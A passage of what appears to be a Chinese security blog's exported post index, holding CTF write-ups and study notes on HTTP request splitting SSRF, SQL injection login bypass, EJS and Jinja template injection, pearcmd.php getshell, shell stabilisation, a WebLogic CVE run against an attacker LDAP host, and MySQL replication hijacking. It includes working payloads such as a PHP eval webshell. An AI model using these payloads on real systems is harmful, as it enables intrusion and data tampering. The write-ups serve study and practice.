deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: PHPSESSID=nk67astv61hqanskkddslkgst4\nConnection: close\n\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n100000\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\"\nContent-Type: application/octet-stream\n\n\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\nGET / HTTP/1.1\ntest:&#x27;&#x27;&#x27;.replace(\"\\n\",\"\\r\\n\")\n\ndef payload_encode(raw):\n    ret = u\"\"\n    for i in raw:\n        ret += chr(0x0100+ord(i))\n    return ret\n\npayload = payload_encode(payload)\nprint(payload)\n\n# 输出: ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ\n\n构造请求：\n&gt; http.get(&gt; http.get(&#x27;http://47.101.57.72:4000/ĠňŔŔŐįıĮıčĊčĊŐŏœŔĠįŵŰŬůšŤĮŰŨŰĠňŔŔŐįıĮıčĊňůųŴĺĠıĲķĮİĮİĮıčĊŃůŮŴťŮŴĭŌťŮŧŴŨĺĠĴĳķčĊŃůŮŴťŮŴĭŔŹŰťĺĠŭŵŬŴũŰšŲŴįŦůŲŭĭŤšŴšĻĠŢůŵŮŤšŲŹĽĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŕųťŲĭŁŧťŮŴĺĠōůźũŬŬšįĵĮİĠĨŗũŮŤůŷųĠŎŔĠıİĮİĻĠŗũŮĶĴĻĠŸĶĴĩĠŁŰŰŬťŗťŢŋũŴįĵĳķĮĳĶĠĨŋňŔōŌĬĠŬũūťĠŇťţūůĩĠŃŨŲůŭťįĹİĮİĮĴĴĳİĮķĲĠœšŦšŲũįĵĳķĮĳĶčĊŁţţťŰŴĺĠŴťŸŴįŨŴŭŬĬšŰŰŬũţšŴũůŮįŸŨŴŭŬīŸŭŬĬšŰŰŬũţšŴũůŮįŸŭŬĻűĽİĮĹĬũŭšŧťįšŶũŦĬũŭšŧťįŷťŢŰĬũŭšŧťįšŰŮŧĬĪįĪĻűĽİĮĸĬšŰŰŬũţšŴũůŮįųũŧŮťŤĭťŸţŨšŮŧťĻŶĽŢĳĻűĽİĮĹčĊŁţţťŰŴĭŅŮţůŤũŮŧĺĠŧźũŰĬĠŤťŦŬšŴťčĊŁţţťŰŴĭŌšŮŧŵšŧťĺĠźŨĭŃŎĬźŨĻűĽİĮĹčĊŃůůūũťĺĠŐňŐœŅœœŉńĽŮūĶķšųŴŶĶıŨűšŮųūūŤŤųŬūŧųŴĴčĊŃůŮŮťţŴũůŮĺĠţŬůųťčĊčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢōŁŘşņŉŌŅşœŉŚŅĢčĊčĊıİİİİİčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŵŰŬůšŤťŤĢĻĠŦũŬťŮšŭťĽĢųŨťŬŬĮŰŨŰĢčĊŃůŮŴťŮŴĭŔŹŰťĺĠšŰŰŬũţšŴũůŮįůţŴťŴĭųŴŲťšŭčĊčĊļĿŰŨŰĠťŶšŬĨĤşŐŏœŔśĢŷŨůšŭũĢŝĩĻĿľčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶčĊŃůŮŴťŮŴĭńũųŰůųũŴũůŮĺĠŦůŲŭĭŤšŴšĻĠŮšŭťĽĢŕŰŬůšŤĢčĊčĊŕŰŬůšŤčĊĭĭĭĭĭĭŗťŢŋũŴņůŲŭłůŵŮŤšŲŹŪńŢĹňōŇŔũŸŁŁķŁŭĶĭĭčĊčĊŇŅŔĠįĠňŔŔŐįıĮıčĊŴťųŴĺ&#x27;)\n\n\n如上图所示，成功构造出了一个文件上传的POST请求，像这样的POST请求可以被我们用于 SSRF。下面我们分析一下整个攻击的过程。\n原始请求数据如下：\nGET / GET / HTTP/1.1\nHost: 47.101.57.72:4000\n\n当我们插入CRLF数据后，HTTP请求数据变成了：\nGET / GET / HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\n......\n eval($_POST[\"whoami\"]);?>\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\n HTTP/1.1\nHost: 47.101.57.72:4000\n\n上次请求包的Host字段和状态行中的 HTTP/1.1 就单独出来了，所以我们再构造一个请求把他闭合：\nGET / GET / HTTP/1.1\n\nPOST /upload.php HTTP/1.1\nHost: 127.0.0.1\nContent-Length: 437\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjDb9HMGTixAA7Am6\n......\n eval($_POST[\"whoami\"]);?>\n------WebKitFormBoundaryjDb9HMGTixAA7Am6\nContent-Disposition: form-data; name=\"Upload\"\n\nUpload\n------WebKitFormBoundaryjDb9HMGTixAA7Am6--\n\nGET / HTTP/1.1\ntest: HTTP/1.1\nHost: 47.101.57.72:4000\n\n","slug":"nodejs(拆分攻击)","date":"2023-04-06T14:47:24.933Z","categories_index":"网络安全学习","tags_index":"js","author_index":"Ttoc"},{"id":"c877094afea6970d987e778fa3ed5361","title":"Cyber Apocalypse 2023 wp","content":"前面几道题太基础，主要记录后面几道题目\n\n\nOrbital\n\n\n\n\n\n\n\n\nIn order to decipher the alien communication that held the key to their location, she needed access to a decoder with advanced capabilities - a decoder that only The Orbital firm possessed. Can you get your hands on the decoder?\n这道题就是sql注入登录，然后在下方可以进行下载文件，通过拦截数据，发现是一个文件包含，点击下载后会响应包中会有文件内容，于是根据本地文件查看得到flag所在文件名，抓包修改包内文件名，对其进行跨目录文件包含，得到flag，难度简单\n\n主要看到一个大佬思路，我是没想到的，所以记录一下\ndef login(def login(username, password):\n    # I don&#x27;t think it&#x27;s not possible to bypass login because I&#x27;m verifying the password later.\n    user = query(f&#x27;SELECT username, password FROM users WHERE username = \"&#123;username&#125;\"&#x27;, one=True)\n\n    if user:\n        passwordCheck = passwordVerify(user[&#x27;password&#x27;], password)\n\n        if passwordCheck:\n            token = createJWT(user[&#x27;username&#x27;])\n            return token\n    else:\n        return False\n\n这里看到username被直接包含到sql语句中去，所以这是存在sql注入，\n这段sql语句主要是查询数据库中用户名为输入数据的在数据表中的用户名和密码，\n然后返回的用户名和密码保存到user变量中\nSELECT username, password FROM users WHERE username SELECT username, password FROM users WHERE username = \"&#123;username&#125;\"\n\n当检测输入了用户名后，进行password校验\nif user:\n       passwordCheck = passwordVerify(user[&#x27;password&#x27;], password)\n\n这里是将用户输入参数password，先进行md5加密，与数据库查询得到的password进行md5比较\ndef passwordVerify(def passwordVerify(hashPassword, password):\n\n  md5Hash = hashlib.md5(password.encode())\n\n  if md5Hash.hexdigest() == hashPassword: return True\n\n  else: return False\n\n其实开始我是最先想到直接插入sql语句，这道题直接注入没有回显，需要报错注入\n\n但是看到一个大佬的wp，我又多了一个新思路\n\n\n\n\n\n\n\n\n\n既然它是将我输入的passwd与它通过存在sql注入漏洞的语句返回的查询值中的passwd进行md5\n比较\n如果，我修改后面的语句，使其返回一个admin用户名以及我伪造的md5密码，是不是就可以把admin用户密码认证伪造掉\n\" union select \"admin\",\"e10adc3949ba59abbe56e057f20f883e\"#\n\n这句话接到后面，前面语句返回为空，接着后面返回admin和密码123456（e10adc3949ba59abbe56e057f20f883e）\n那么它就会把123456认为是admin的正确密码，然后和我们输入的密码进行对比，从而我们成功登录admin账户\n\n这是很好的思路，这比直接利用sql注入更加优雅，还是我对代码的敏感性不够\n\n\n","slug":"2023Cyber-Apocalypse","date":"2023-03-25T06:57:02.412Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"797ca882649370ce9de496b0772408c1","title":"hxp2022 wp","content":"在ctftime看到的，题目有深度的\n\n\n\n\n\n\n\n\n\n\n\nDisclaimer\nThis challenge offers an individual instance for you and therefore runs behind a proxy requesting login credentials. Locally use hxp:hxp.\n每个题的docker-compose.yml文件需要修改一下\n   build:\n+    context: .\n     dockerfile: Dockerfile\n\nvalentineWEB\nDifficulty estimate: - easy\n\n\n\n\n\n\n\n\n\nDescription:\nCreate an awesome template for your valentine and share it with the world!\n开始页面一看就知道是node.js的ssti\n\n\n尝试直接用payload解决\n\n\n发现输入的数据实际上就是实现一个前端的效果，并不被模板化\n看看app.js\nvar express = require(var express = require(&#x27;express&#x27;);\nvar bodyParser = require(&#x27;body-parser&#x27;)\nconst crypto = require(\"crypto\");\nvar path = require(&#x27;path&#x27;);\nconst fs = require(&#x27;fs&#x27;);\n\nvar app = express();\nviewsFolder = path.join(__dirname, &#x27;views&#x27;);\n\nif (!fs.existsSync(viewsFolder)) &#123;\n  fs.mkdirSync(viewsFolder);\n&#125;\n\napp.set(&#x27;views&#x27;, viewsFolder);\napp.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);\n\napp.use(bodyParser.urlencoded(&#123; extended: false &#125;))\n\napp.post(&#x27;/template&#x27;, function(req, res) &#123;\n  let tmpl = req.body.tmpl;\n  let i = -1;\n  while((i = tmpl.indexOf(\", i+1)) >= 0) &#123;\n    if (tmpl.substring(i, i+11) !== \"\") &#123;\n      res.status(400).send(&#123;message:\"Only &#x27;&#x27; is allowed.\"&#125;);\n      return;\n    &#125;\n  &#125;\n  let uuid;\n  do &#123;\n    uuid = crypto.randomUUID();\n  &#125; while (fs.existsSync(`views/$&#123;uuid&#125;.ejs`))\n\n  try &#123;\n    fs.writeFileSync(`views/$&#123;uuid&#125;.ejs`, tmpl);\n  &#125; catch(err) &#123;\n    res.status(500).send(\"Failed to write Valentine&#x27;s card\");\n    return;\n  &#125;\n  let name = req.body.name ?? &#x27;&#x27;;\n  return res.redirect(`/$&#123;uuid&#125;?name=$&#123;name&#125;`);\n&#125;);\n\napp.get(&#x27;/:template&#x27;, function(req, res) &#123;\n  let query = req.query;\n  let template = req.params.template\n  if (!/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i.test(template)) &#123;\n    res.status(400).send(\"Not a valid card id\")\n    return;\n  &#125;\n  if (!fs.existsSync(`views/$&#123;template&#125;.ejs`)) &#123;\n    res.status(400).send(&#x27;Valentine\\&#x27;s card does not exist&#x27;)\n    return;\n  &#125;\n  if (!query[&#x27;name&#x27;]) &#123;\n    query[&#x27;name&#x27;] = &#x27;&#x27;\n  &#125;\n  return res.render(template, query);\n&#125;);\n\napp.get(&#x27;/&#x27;, function(req, res) &#123;\n  return res.sendFile(&#x27;./index.html&#x27;, &#123;root: __dirname&#125;);\n&#125;);\n\napp.listen(process.env.PORT || 3000);\n\n在这里\napp.post(&#x27;/template&#x27;, function(app.post(&#x27;/template&#x27;, function(req, res) &#123;\n  let tmpl = req.body.tmpl;\n  let i = -1;\n  while((i = tmpl.indexOf(\", i+1)) >= 0) &#123;\n    if (tmpl.substring(i, i+11) !== \"\") &#123;\n      res.status(400).send(&#123;message:\"Only &#x27;&#x27; is allowed.\"&#125;);\n      return;\n    &#125;\n  &#125;\n  let uuid;\n  do &#123;\n    uuid = crypto.randomUUID();\n  &#125; while (fs.existsSync(`views/$&#123;uuid&#125;.ejs`))\n\n  try &#123;\n    fs.writeFileSync(`views/$&#123;uuid&#125;.ejs`, tmpl);\n  &#125; catch(err) &#123;\n    res.status(500).send(\"Failed to write Valentine&#x27;s card\");\n    return;\n  &#125;\n  let name = req.body.name ?? &#x27;&#x27;;\n  return res.redirect(`/$&#123;uuid&#125;?name=$&#123;name&#125;`);\n&#125;);\n\n发现它会将输入的tmpl写入views/$&#123;uuid&#125;.ejs当作模板\ntry &#123;\n  fs.writeFileSync(`views/$&#123;uuid&#125;.ejs`, tmpl);\n&#125; catch(err) &#123;\n  res.status(500).send(\"Failed to write Valentine&#x27;s card\");\n  return;\n&#125;\n\n但是存在校验\nwhile((i = tmpl.indexOf(&quot;&lt;%&quot;, i+1)) &gt;= while((i = tmpl.indexOf(&quot;&lt;%&quot;, i+1)) &gt;= 0) &#123;\n  if (tmpl.substring(i, i+11) !== \"\") &#123;\n    res.status(400).send(&#123;message:\"Only &#x27;&#x27; is allowed.\"&#125;);\n    return;\n  &#125;\n&#125;\n\n这段语句限制了如果输入的字段开头为&lt;%，那么从&lt;%开头后的字段必须是&lt;%= name %&gt;\n开始尝试各种方法绕过，但确实不行，因为仅能是&lt;%= name %&gt;,里面也不能加东西\n\n\n\n\n\n\n\n\n\n后面只有看wp才有思路，既然是从&lt;%进行匹配限制，如果可以修改模板语句让其不是&lt;%的开头，\n所以绕过的思路就是能用其他的标签进行绕过\n但是在文档中查看时会发现，所有都是以&lt;%开头的标签\n\ndelimitermde&#x2F;ejs: Embedded JavaScript templates delimiter\n可以看到标签几乎都是以&lt;%开头和结尾的，\n后面看官方wp时\n\n\n\n\n\n\n\n\n\nIn his analysis, Eslam even scratches the possibility to overwrite options which are passed with data. He specifically mentions the delimiter in the context of abusing it for catastrophic regex.\nIn what scenario does anybody even want to pass options with untrusted user data?\nEspecially: Options which greatly affect the parsing of the template like ?delimiter\nAnd: Could this “feature” maybe be abused in any way?\nThus, the idea for this challenge was born.\n大致意思就是因为大都ssti过滤就只是对分隔符进行正则匹配过滤，但是如果有选项比如delimiter，可以利用其以不受信任的用户身份发生数据或者以其他形式滥用\ndelimiter就是对标签的分隔符定义的选项，这样我们就可以通过其修改覆盖标签，从&lt;%=变成&lt;?=或者&lt;==等等\n\n但是如何传参使得标签覆盖并且同时传入我们的payload？\napp.get(&#x27;/:template&#x27;, function(app.get(&#x27;/:template&#x27;, function(req, res) &#123;\n  let query = req.query;\n  let template = req.params.template\n  if (!/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i.test(template)) &#123;\n    res.status(400).send(\"Not a valid card id\")\n    return;\n  &#125;\n  if (!fs.existsSync(`views/$&#123;template&#125;.ejs`)) &#123;\n    res.status(400).send(&#x27;Valentine\\&#x27;s card does not exist&#x27;)\n    return;\n  &#125;\n  if (!query[&#x27;name&#x27;]) &#123;\n    query[&#x27;name&#x27;] = &#x27;&#x27;\n  &#125;\n  return res.render(template, query);\n&#125;);\n\n其中看到关键代码\nreturn res.return res.render(template, query);\n\n这里会将template和query内容渲染，将query中的值把模板中变量的值替换，从而可以通过在query中重新定义delimiter参数，然后实现渲染覆盖原有的?分割符，将其替换成其他可以绕过的分隔符\n但是这里还有过滤，对template进行的过滤，而template取自:template\n\n\n\n\n\n\n\n\n\n:template 是一个动态路由参数，它可以匹配 URL 中的任何值。例如，如果请求的 URL 是 http://example.com/about，那么 :template 就会被设置为 about\n而template的正则匹配内容\n!/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;!/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;\n\n搜索发现是 UUID version 4 的格式，而uuid在上面代码出现\nreturn res.redirect(`/$&#123;uuid&#125;?name=return res.redirect(`/$&#123;uuid&#125;?name=$&#123;name&#125;`);\n\n这是重定向时生成的uuid，代表当我们被重定向后，\napp会自动渲染下面内容\nhttp://x.x.x.x:9086/365c9839-b1a3-4df9-8c1a-142378b79cd5?name=1\n\n所以可以先抓包，得到重定向的uuid，\n然后在后面添加delimiter参数，重新发包，从而实现利用渲染覆盖原有分隔符的目的，然后在按上面的代码POST发送tmpl参数【包含的是修改了分隔符的payload】\n\n解题流程先打算将覆盖%换成?，先发送到/template，这里因为没有黑名单限制字符，于是我们的内容成功写入views/$&#123;uuid&#125;.ejs文件中，而uuid就是响应包中的\n\n\n\n\n\n\n\n\n\n77354ee1-466d-402f-a829-ec5e859c223e\n\n但是在views/$&#123;uuid&#125;.ejs文件中是以%为分隔符，于是需要修改分隔符为payload的?\n\n得到flag\n\n进docker看看\n\n\n","slug":"2022hxp","date":"2023-03-10T07:03:20.894Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"cfe293c9110123a937624906f872053b","title":"笔记","content":"关键笔记，主要总结比赛中遇到的\n\n\npearcmd.php的巧妙利用\n\n\n\n\n\n\n\n\n来自P神博客\nhttps://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp\n就是利用pearcmd.php这个pecl/pear中的文件。\npecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。\n不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php。\n\n\n\n\n\n\n\n\n\n原本pear&#x2F;pcel是一个命令行工具，并不在Web目录下，即使存在一些安全隐患也无需担心。但我们遇到的场景比较特殊，是一个文件包含的场景，那么我们就可以包含到pear中的文件，进而利用其中的特性来搞事。\n?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/+/tmp/hello.php\n\n\n\n\n\n\n\n\n\n\n#config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中\n发送数据包，目标将会写入一个文件/tmp/hello.php，其内容包含&lt;?=phpinfo()?&gt;\n\n\n\n\n\n\n\n\n\n/tmp/hello.php当然也可以改成/var/html/www，这样就可以直接读取，不用利用文件包含参数进行对/tmp/hello.php读取\n只是放在/tmp下不容易触发防火墙被删除\n利用文件包含存在，再包含这个文件，就会显示我们的信息\n\n\n\n\n\n\n\n\n\n&lt;?=phpinfo()?&gt;也可以改写成&lt;?=eval($_POST[8]);&gt;这样就可以执行更多的命令了\nlibmbfl打分\n\n\n\n\n\n\n\n\n所以实现$charset == BASE64，只要文件内容前面数据让它识别为base64即可\n那么如何让其认为是base64呢？\n这就涉及到libmbfl的打分，libmbfl是mb扩展\nhttps://github.com/php/php-src/blob/master/ext/mbstring/libmbfl/mbfl/mbfilter.c#L225\n我的理解就是类似像checkengine，比如mb_detect_encoding()这类的函数对内容进行编码的识别，就是匹配内容中的一些符合编码的字符，匹配成功对应编码加分，最后从头到尾匹配完成后，打分最高的编码就被认为是该内容的编码\n这是打分判断\n\n\n\n\n\n\n\n\n\n0xFFFF是-1，&gt;&#x3D;0 \n\n0x21是33 33对应!\n0x2F是47 47对应&#x2F;\n47&gt;=c&gt;=33\n/打分打的多\n\nTomcat以;一种奇怪的方式进行规范化\n\n\n\n\n\n\n\n\n;后的数据不解析\n即可http://127.0.0.1/index;123.ico，读取时只视为http://127.0.0.1/index\n服务器端XSS【针对于动态PDF】\n\n\n\n\n\n\n\n\nhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdfhttps://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf\n还是从htb的机器学习到的\n\n\n\n\n\n\n\n\n\n比如，在一些购物网站订单会自动生成一个动态的pdf方便打印作为报销的凭证，\n但是虽然看起像是pdf，但本质还是html网站。才可以实现动态，而其中的数据也是客户端传向服务器生成\n那么如果传向服务器进行动态pdf生成的数据被用户控制，导致最后生成的pdf中的数据返回一些服务器的敏感的数据，就会非常危险\n\n\n\n\n\n\n\n\n\n如果网页使用用户控制的输入创建 PDF，您可以尝试诱骗创建 PDF 的机器人执行任意 JS 代码。 因此，如果 PDF 创建者机器人找到某种 HTML 标记，它将解释它们，您可以滥用此行为导致服务器 XSS。\n请注意，&lt;script&gt;&lt;/script&gt; 标签并不总是有效，因此您需要不同的方法来执行 JS（例如，滥用 &lt;img,&lt;iframe&gt;）。 \n另外，请注意，在常规利用中，您将能够查看&#x2F;下载创建的pdf，因此您将能够看到通过JS编写的所有内容（例如使用document.write（））。\n但是，如果您看不到创建的PDF，则可能需要提取信息，从而向您发出Web请求（盲写，然后看回显猜测）。\n获得稳定的shell【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】\n\n\n\n\n\n\n\n\n\n\npython -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’ 或者\n**python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’**进入交互式shell\n\nCtrl-Z将shell放到后台\n\nstty raw -echo ; fg ; reset\n\n\n&#x2F;&#x2F;stty 设置终端端口设备的接口选项\n&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls\n&#x2F;&#x2F;fg把shell提到前台来\n&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断\n\n成功获得全交互式shell\nT3协议的反序列化攻击这是在复现CVE-2023-21839时，查看其利用的基本原理T3&#x2F;时看到的\n学习文章\n记第一次公网测试比如，在复现cve-2023-21839时\n./web.exe -ip 公网ip -port 7001 -ldap ldap://另一个公网ip（挂者jndi）:1389/xx\n\n如果想在本机进行复现，需要让自己的ip变成可以被公网访问的ip，在上面进行打开ldap，以及挂上恶意类，否则只能本地测试\nfile -b解析#!后内容显示这里就需要一个知识点#!后的内容，会被视为文件的解释器，然后打印出来，比如\n\n这里\na &#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; script, ASCII text executable\n\n就看出来它把文本\n&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;\n\n当作了script解析器，在解析文件类型时，就把它打印出来了\n于是我们上传该文件\n\n得到flag\nstrace命令在Linux系统中，strace命令是一个集诊断、调试、统计与一体的工具，可用来追踪调试程序，能够与其他命令搭配使用。\n在Linux世界，进程不能直接访问硬件设备，当进程需要访问硬件设备 (比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。\n而对于一些命令而言也可以监控其调用的一些文件信息\n比如\nstrace /bin/file\n#查询file命令执行需要调用的文件信息\n\n\n可以看到调用了一个/etc/ld.so.preload文件\n\nMysql主从复制\n\n\n\n\n\n\n\n\n主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新，也就是主库只传日志给从库，从库根据日志执行命\n[学习文章]\n作者：小熊我不要了链接：https://juejin.cn/post/6844903921677238285\n在某比赛遇到的，一个sql注入环境，对语句过滤很多，也包括select、updatexml等等常用的语句。\n但是没有过滤show，slave，change等语句\n\n该题需要一个登录，是在一个php语句中\n大概是从ctf库中，查询其中的admin表，匹配其中用户名和密码\n但是ctf库，利用show tables in ctf;发现是一个空库，连表也没有，也就是直接登录改根本不行，需要修改它的数据库，添加用户信息\nshow variables like &#39;secure_file_priv&#39;;查看其有没有可以被读取或写入的文件，也是空\n\n所以根据主从复制的思路就是，攻击机搭建一个数据库作为主库，而环境的数据库当作从库，从而实现在攻击上进行修改使得从库【环境数据库】被修改\n为什么会想到利用主从复制，其实很简单，过滤了这么多，但是执行\nshow slave status;\n\n可以看到回显，并且显示Running\n\n\n\n\n\n\n\n\n\n主从配置\n在主从配置之前需要确保两台mysql需要同步的库状态一致。\n攻击机【主】配置文件默认在/etc/my.cnf下。\n在配置文件中新增配置：\n[mysqld]\n## 同一局域网内注意要唯一\nserver-id=100  \n## 开启二进制日志功能，可以随便取（关键）\nlog-bin=mysql-bin\n\n修改配置后需要重启才能生效：\nservice mysql restart\n\n重启之后进入mysql：\nmysql -uroot -p\n\n在master数据库创建数据同步用户，授予用户 slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。\nCREATE USER &#x27;slave&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;@#$Rfg345634523rft4fa&#x27;;\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;slave&#x27;@&#x27;%&#x27;;\n\n语句中的%代表所有服务器都可以使用这个用户，如果想指定特定的ip，将%改成ip即可。\n查看主mysql的状态：\nshow master status;\n\n记录下File和Position的值，并且不进行其他操作以免引起Position的变化。\n\n\n\n\n\n\n\n\n\n\nFile：这是 MySQL 服务器正在写入的当前二进制日志文件的名称。\nPosition：这是下一个事件将被写入的二进制日志文件中的位置。\n环境执行【从】配置环境已经有了，所以不用考虑如何修改\n\n\n\n\n\n\n\n\n\n在从my.cnf配置中新增：\nmysqld]\n## 设置server_id,注意要唯一\nserver-id=101  \n## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用\nlog-bin=mysql-slave-bin   \n## relay_log配置中继日志\nrelay_log=edu-mysql-relay-bin\n\n修改配置后需要重启才能生效：\n修改主库信息，将主库信息改成攻击机，用户名和密码都是主机之前建立的\nchange master to master_host=&#x27;攻击机ip&#x27;, master_user=&#x27;slave&#x27;, master_password=&#x27;@#$Rfg345634523rft4fa&#x27;, master_port=3306, master_log_file=&#x27;mysql-bin.000064&#x27;, master_log_pos= 12, master_connect_retry=30;\n\n\n\n\n\n\n\n\n\n\n*注：日志的postion和file要修改成自己的攻击机对应的，指定从库从哪个文件进行读取，从哪个位置进行读取\n修改后，执行\nstart slave;\n#开启主从复制\n\n然后执行\nshow slave status;\n#查看同步状态\n\n得到SlaveIORunning 和 SlaveSQLRunning 